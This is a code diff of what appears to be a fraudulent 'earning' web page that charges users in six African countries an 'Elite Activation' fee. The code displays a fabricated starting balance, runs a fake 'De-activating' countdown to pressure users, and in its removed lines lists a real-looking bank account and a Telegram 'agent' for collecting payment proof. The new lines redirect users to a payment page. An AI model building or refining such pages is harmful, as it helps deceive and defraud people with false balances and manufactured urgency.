@@ -93,6 +93,17 @@
             background: linear-gradient(135deg, #f5e050 0%, #d4af37 100%);
             color: #000; font-weight: 800;
         }
+
+        select {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            color: white;
+            width: 100%;
+            padding: 15px;
+            border-radius: 15px;
+            outline: none;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -227,28 +238,31 @@
 
     <div id="activationPopup" class="popup-overlay">
         <div class="bg-zinc-950 border border-zinc-900 rounded-[45px] w-full max-w-sm p-8 text-center relative overflow-hidden">
-            <div id="paymentInitial">
-                <h2 class="gold-text text-xl font-black italic mb-2 uppercase">Elite Activation</h2>
-                <p id="feeLabel" class="text-zinc-500 text-[10px] font-black uppercase tracking-widest mb-10">Syncing fee...</p>
-                <div class="bg-black border border-zinc-900 rounded-3xl p-6 mb-8 text-left space-y-6" id="bankDetails"></div>
-                <button onclick="startVerification()" class="activate-gradient w-full py-5 rounded-[22px] text-[11px] uppercase tracking-widest shadow-2xl active:scale-95">
-                    I HAVE MADE PAYMENT
-                </button>
+            <h2 class="gold-text text-xl font-black italic mb-2 uppercase">Elite Activation</h2>
+            <p class="text-zinc-500 text-[10px] font-black uppercase tracking-widest mb-8">Select Your Region</p>
+            
+            <div class="mb-8">
+                <select id="activationCountry">
+                    <option value="Nigeria">Nigeria (NGN)</option>
+                    <option value="Ghana">Ghana (GHS)</option>
+                    <option value="Cameroon">Cameroon (XAF)</option>
+                    <option value="Uganda">Uganda (UGX)</option>
+                    <option value="South Africa">South Africa (ZAR)</option>
+                    <option value="Kenya">Kenya (KES)</option>
+                </select>
             </div>
-            <div id="paymentVerifying" class="hidden py-4">
-                <h3 class="text-white font-black italic uppercase text-lg mb-2 text-center">Almost Done</h3>
-                <button onclick="sendProof()" class="w-full bg-[#229ED9]/10 border border-[#229ED9]/30 py-5 rounded-2xl flex items-center justify-center gap-3 mt-8">
-                    <i class="fab fa-telegram text-[#229ED9] text-xl"></i>
-                    <span class="text-[10px] font-black uppercase text-white tracking-widest">Submit to Agent</span>
-                </button>
-            </div>
+
+            <button onclick="goToPayment()" class="activate-gradient w-full py-5 rounded-[22px] text-[11px] uppercase tracking-widest shadow-2xl active:scale-95">
+                CONFIRM & PROCEED
+            </button>
+            
             <button onclick="closeActivation()" class="text-[10px] font-black text-zinc-700 uppercase tracking-widest mt-8 block w-full">Go Back</button>
         </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, doc, onSnapshot, getDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        import { getFirestore, doc, onSnapshot, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyAyMQQK0qbw1lpeuPcPmFgSpBoy1yFKFJE",
@@ -265,25 +279,7 @@
         const currentUsername = localStorage.getItem('glamour_username') || "EliteGuest";
         document.getElementById('userDisplay').innerText = "@" + currentUsername;
 
-        let liveSettings = {
-            tgLink: "GLAMOUROFFICIAL_2",
-            ngBank: "KUDA", ngAcc: "93003738174", ngName: "BERRY MEDIA ENTERPRISE III — GLAMOUR WEBSITE",
-            ghBank: "MTN Momo", ghAcc: "XXXXXXXXX", ghName: "Agent Name",
-            cmBank: "MTN Mobile", cmAcc: "XXXXXXXXX", cmName: "Agent Name",
-            ugBank: "MTN/Airtel", ugAcc: "07XXXXXXXX", ugName: "Agent Name",
-            saBank: "Capitec/Standard", saAcc: "XXXXXXXXX", saName: "Agent Name",
-            keBank: "M-Pesa", keAcc: "07XXXXXXXX", keName: "Agent Name"
-        };
-
-        const settingsDocRef = doc(db, 'admin', 'settings');
         const userDocRef = doc(db, 'users', currentUsername);
-
-        onSnapshot(settingsDocRef, (snapshot) => {
-            if (snapshot.exists()) {
-                liveSettings = { ...liveSettings, ...snapshot.data() };
-                getDoc(userDocRef).then(snap => { if(snap.exists()) syncUI(snap.data()); });
-            }
-        });
 
         onSnapshot(userDocRef, (snapshot) => {
             if (snapshot.exists()) {
@@ -293,27 +289,21 @@
 
         function syncUI(userData) {
             const country = userData.country || "Nigeria";
-            let symbol = "₦", bank, acc, name, fee, bonus;
+            let symbol = "₦", bonus = 14000;
 
             switch(country) {
-                case "Ghana": symbol = "GHS "; bank = liveSettings.ghBank; acc = liveSettings.ghAcc; name = liveSettings.ghName; fee = "220 GHS"; bonus = 220; break;
-                case "Cameroon": symbol = "XAF "; bank = liveSettings.cmBank; acc = liveSettings.cmAcc; name = liveSettings.cmName; fee = "13,000 XAF"; bonus = 13000; break;
-                case "Uganda": symbol = "UGX "; bank = liveSettings.ugBank; acc = liveSettings.ugAcc; name = liveSettings.ugName; fee = "85,000 UGX"; bonus = 85000; break;
-                case "South Africa": symbol = "R "; bank = liveSettings.saBank; acc = liveSettings.saAcc; name = liveSettings.saName; fee = "450 ZAR"; bonus = 450; break;
-                case "Kenya": symbol = "KSh "; bank = liveSettings.keBank; acc = liveSettings.keAcc; name = liveSettings.keName; fee = "2,800 KES"; bonus = 2800; break;
-                default: symbol = "₦"; bank = liveSettings.ngBank; acc = liveSettings.ngAcc; name = liveSettings.ngName; fee = "₦14,000"; bonus = 14000;
+                case "Ghana": symbol = "GHS "; bonus = 220; break;
+                case "Cameroon": symbol = "XAF "; bonus = 13000; break;
+                case "Uganda": symbol = "UGX "; bonus = 85000; break;
+                case "South Africa": symbol = "R "; bonus = 450; break;
+                case "Kenya": symbol = "KSh "; bonus = 2800; break;
+                default: symbol = "₦"; bonus = 14000;
             }
 
             const currentBal = (userData.balance || 0) === 0 ? bonus : userData.balance;
             document.getElementById('mainBalance').innerText = symbol + currentBal.toLocaleString();
             document.getElementById('indirectIncome').innerText = symbol + (userData.indirectEarnings || 0).toLocaleString();
             document.getElementById('countryDisplay').innerText = country.toUpperCase() + " REGION";
-            document.getElementById('feeLabel').innerText = "Activation: " + fee;
-            document.getElementById('bankDetails').innerHTML = `
-                <div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Method</p><p class="text-xs font-bold text-white uppercase">${bank}</p></div>
-                <div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Account No</p><p class="text-xl font-black gold-text">${acc}</p></div>
-                <div><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Name</p><p class="text-xs font-bold text-white uppercase">${name}</p></div>
-            `;
         }
 
         window.showProceed = (title) => {
@@ -321,21 +311,24 @@
             document.getElementById('proceedPopup').style.display = 'flex';
         };
         window.closeProceed = () => document.getElementById('proceedPopup').style.display = 'none';
+        
         window.openActivation = () => {
             closeProceed();
-            document.getElementById('paymentInitial').classList.remove('hidden');
-            document.getElementById('paymentVerifying').classList.add('hidden');
             document.getElementById('activationPopup').style.display = 'flex';
         };
         window.closeActivation = () => document.getElementById('activationPopup').style.display = 'none';
-        window.startVerification = () => {
-            document.getElementById('paymentInitial').classList.add('hidden');
-            document.getElementById('paymentVerifying').classList.remove('hidden');
-        };
-        window.sendProof = () => {
-            const handle = liveSettings.tgLink.replace('@', '');
-            const msg = `Hello Admin, I have paid my activation fee.\n\nUsername: @${currentUsername}`;
-            window.open(`https://t.me/${handle}?text=${encodeURIComponent(msg)}`);
+
+        // REDIRECT LOGIC
+        window.goToPayment = async () => {
+            const selectedCountry = document.getElementById('activationCountry').value;
+            try {
+                // Update the user's country in Firebase before moving to payment
+                await updateDoc(userDocRef, { country: selectedCountry });
+                window.location.href = "payment.html";
+            } catch (err) {
+                // If update fails, still redirect
+                window.location.href = "payment.html";
+            }
         };
 
         // --- TIMER LOGIC ---
@@ -346,23 +339,17 @@
             const countdownInterval = setInterval(() => {
                 minutes = parseInt(timer / 60, 10);
                 seconds = parseInt(timer % 60, 10);
-
                 minutes = minutes < 10 ? "0" + minutes : minutes;
                 seconds = seconds < 10 ? "0" + seconds : seconds;
-
                 display.textContent = "De-activating: " + minutes + ":" + seconds;
-
                 if (--timer < 0) {
                     clearInterval(countdownInterval);
                     display.textContent = "DE-ACTIVATED";
-                    display.classList.remove('text-red-500');
-                    display.classList.add('text-zinc-600');
                 }
             }, 1000);
         }
 
         window.onload = () => {
-            // Set for 20 minutes (1200 seconds)
             startTimer(1200);
         };
     </script>
